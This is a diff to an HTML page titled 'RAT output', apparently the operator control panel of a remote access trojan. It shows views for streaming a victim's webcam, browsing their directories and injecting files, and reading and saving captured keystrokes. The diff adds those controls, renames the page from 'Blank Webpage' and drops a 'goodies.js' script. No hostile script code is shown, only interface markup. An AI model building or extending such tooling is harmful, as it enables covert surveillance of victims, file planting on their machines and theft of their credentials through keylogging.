@@ -11,11 +11,11 @@
     <meta name="author" content="Samuel A. Matheson">
     <meta charset="utf-8">
 
-    <link rel="icon" href="res/img/favico.webp" type="image/webp" sizes="32x32">
+    <link rel="icon" href="res/img/47240.png" type="image/png" sizes="32x32">
     <link href="https://fonts.googleapis.com/css?family=Lexend+Deca|Roboto&display=swap" rel="stylesheet">
     <link rel="stylesheet" type="text/css" href="res/css/index.css">
 
-    <title>Blank Webpage</title>
+    <title>RAT output</title>
 </head>
 
 <body>
@@ -24,8 +24,10 @@
     <div class="view" id="webcam_view">
         <div class="title">Webcam</div>
         <video autoplay="true" id="webcam_preview"></video>
-        <button id="stop_video" class="video_btn">stop video</button>
-        <button id="start_video" class="video_btn">start video</button>
+        <div class="btn_wrapper">
+            <button id="stop_video" class="video_btn" title="attempt to start video feed">stop video</button>
+            <button id="start_video" class="video_btn" title="attempt to close video feed">start video</button>
+        </div>
     </div>
 
     <!-- directory controls -->
@@ -33,17 +35,22 @@
         <div class="title" id="full_path">Directories</div>
         <div id="back_a_dir" title="go back a directory"></div>
         <div id="dirbox"></div>
-        <button id="inject_file" class="video_btn">Inject file</button>
+        <div class="btn_wrapper">
+            <input type="file" class="video_btn" name="Select file to inject" id="file_selector">
+            <button id="inject_file" class="video_btn">Inject file</button>
+        </div>
     </div>
 
     <!-- Keylog controls -->
     <div class="view" id="keylog_view">
         <div class="title">Keylogg</div>
         <div id="keybox"></div>
+        <div class="btn_wrapper">
+            <button id="save_log" class="video_btn" title="save keylog to text file">save keylog</button>
+        </div>
     </div>
 
     <script type="text/javascript" src="res/js/index.js"></script>
-    <script type="text/javascript" src="res/js/goodies.js"></script>
 </body>
 
 </html>
